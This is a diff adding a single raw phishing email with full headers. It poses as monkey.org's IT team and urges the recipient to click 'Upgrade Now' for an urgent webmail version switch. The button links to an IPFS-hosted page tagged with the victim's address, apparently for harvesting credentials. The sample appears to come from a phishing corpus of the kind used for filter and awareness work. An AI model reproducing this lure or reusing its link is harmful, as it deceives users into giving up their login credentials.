@@ -1,0 +1,147 @@
+From jose@monkey.org Thu May 11 06:22:22 2023 +0000
+Return-Path: bounces@henrikoffice.us
+Delivered-To: jose@monkey.org
+X-FDA: 80776979724.28.9F40D8B
+Received: from mail.krankenversicherungsangebot.com (mail.krankenversicherungsangebot.com [62.233.57.214])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id AFF04A0009
+	for <jose@monkey.org>; Thu, 11 May 2023 06:22:20 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;
+	dkim=pass header.d=krankenversicherungsangebot.com header.s=default header.b=FSVBUmYg;
+	dmarc=pass (policy=none) header.from=krankenversicherungsangebot.com;
+	spf=none (imf10.b.hostedemail.com: domain of bounces@henrikoffice.us has no SPF policy when checking 62.233.57.214) smtp.mailfrom=bounces@henrikoffice.us
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683786141;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=0/bYXyovfi6qYCr7NYJeSK9+INC+Au6RJP84u9jBoo8=;
+	b=MJo7sZRNNtV44WFGFFKmLU6g1Hj112nzcVzFSJQystc1GSQegkoJcKiGAEmq1NZ3XHdAvC
+	3QlsjL22FTCeooBs9X5B5DmuHhMWWjRXufeACG1x8CXZhwnFdaU4LyOCgOreBgIZg8smVj
+	p6yk8gnJP5ZQ+btMpnGgZePqHi+6Rgo=
+ARC-Authentication-Results: i=1;
+	imf10.b.hostedemail.com;
+	dkim=pass header.d=krankenversicherungsangebot.com header.s=default header.b=FSVBUmYg;
+	dmarc=pass (policy=none) header.from=krankenversicherungsangebot.com;
+	spf=none (imf10.b.hostedemail.com: domain of bounces@henrikoffice.us has no SPF policy when checking 62.233.57.214) smtp.mailfrom=bounces@henrikoffice.us
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683786141; a=rsa-sha256;
+	cv=none;
+	b=lZPFdmPvuTp6ClefuKaAo4RMMNDApG4ximKjsOYeGTVjZLdi4LbguyUcm62tdN3Dm2KYC+
+	sBuekb6pv4IsxY+sBtzi1sFAZc8m48q+ODALS1qXlYOtXUtLaZBvRbG3Vke+ZG/RDh1RU/
+	QBqUupx/kaT/zpgFY6zKAoUkZnB+SEI=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=krankenversicherungsangebot.com; s=default; h=From:To:Subject:
+	MIME-Version:Content-Type:Content-Transfer-Encoding; bh=MsgH6gyp
+	d3oqMbC1qDpkLOi4Uhc=; b=FSVBUmYgNCpsqL7/vLJ5A0vleiupkIOr6EbYw0X+
+	Ym5gc1vinV7HQQv91OVgojgoBwjYbF0aFW2qtT6CC07UTyG/8lDjRZsV6LGr7oIW
+	TXAL461QStl07g3yw2x1sXEDtgWbLpQVj/eAa1aGbNhZPKqx6vIsc+uZK+BMF5+g
+	qmE=
+From: "Email Support Monkey.Org" <server@krankenversicherungsangebot.com>
+To: jose@monkey.org
+Subject: New Message Notification - Webmail Upgrade Monkey.Org
+Date: 10 May 2023 23:22:19 -0700
+Message-ID: <20230510232219.249F2B4237F0B599@krankenversicherungsangebot.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: AFF04A0009
+X-Rspam-User: 
+X-Stat-Signature: xaqnacg5gkc7qqfaoee43zmh3sntpjpe
+X-Spam-Status: No, score=0.70
+X-HE-Tag: 1683786140-277956
+X-HE-Meta: U2FsdGVkX19hB1Q2Hp/+8cZTEyp11gpUvEgdA9dZbUcBZ2GJJw5zVH4fc2xMQMfsg0Q4XcDSvwFKMZRgSl+/qtYfQkIEUa12hVFRRqTn7ZH0x5FPwTNqpMrFUxfGsZ9GhOvh2I8avJcmb4QTUrXYxk5gcZlsICQ91qZuryZGuX2rV9TTMq+QJcug0nvGT8CDj2tAltM/bJDfWs3nh5J37g9ybYzYnCxaLwsVDxasu0Q=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 107
+
+<!DOCTYPE html>
+
+<html><head>
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+    <meta charset=3D"UTF-8">
+    <title>New Webmail Version</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-size: 12px;
+        line-height: 1.5;
+        color: #333;
+        border: 1px solid #ccc;
+        margin: 20px 20px 20px 40px;
+        max-width: 400px;
+        padding: 20px;
+        text-align: justify;
+      }
+      h1, h2, h3, h4, h5, h6 {
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-weight: 700;
+        margin-top: 0;
+      }
+      .button {
+        display: inline-block;
+        padding: 8px 16px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+        border: none;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-weight: 700;
+        text-transform: uppercase;
+      }
+      .button:hover {
+        background-color: #0069d9;
+      }
+    </style>
+    <link href=3D"https://fonts.googleapis.com/css?family=3DSegoe+UI|Tahoma=
+&amp;display=3Dswap" rel=3D"stylesheet">
+  </head>
+  <body style=3D"font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-size: 12px;
+        line-height: 1.5;
+        color: #333;
+        border: 1px solid #ccc;
+        margin: 20px 20px 20px 40px;
+        max-width: 400px;
+        padding: 20px;
+        text-align: justify">
+    <h1 style=3D"font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-weight: 700;
+        margin-top: 0; font-size: 16px;">Webmail Upgrade - Urgent Version S=
+witch</h1>
+    <p><strong>To: </strong>jose@monkey.org<br><strong>From: </strong>Suppo=
+rt monkey.org &lt;support@monkey.org<br><strong>Subject: </strong>High Prio=
+rity Webmail Version Switch</p>
+    <hr>
+    <p>We are excited to announce the release of our new webmail version. T=
+his new version comes with many improvements and features that will make yo=
+ur email experience faster and more efficient.</p>
+    <p>To start using the new version, follow the link below to continue.</=
+p>
+    <br>
+    <a style=3D"display: inline-block;
+        padding: 8px 16px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+        border: none;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-weight: 700;
+        text-transform: uppercase" class=3D"button" href=3D"https://dweb.li=
+nk/ipfs/QmbJwY95pKfAp8Jdv18fLPC9rM7nyWKQWhdwwESoXHoSJZ?filename=3Ddsoh-sdho=
+u-2983-sfd%26%4028.html#jose@monkey.org" target=3D"_self">Upgrade Now</a>
+    <br>
+    <p><br></p><p>IMAP will be disconnected from the current webmail versio=
+n.</p>
+    <p>Perform this urgent action to avoid loss of important emails.</p>
+    <br>
+    <p>Thank you,</p>
+    <p><strong>Monkey.Org </strong>The IT Team</p>
+=20=20
+</body></html>
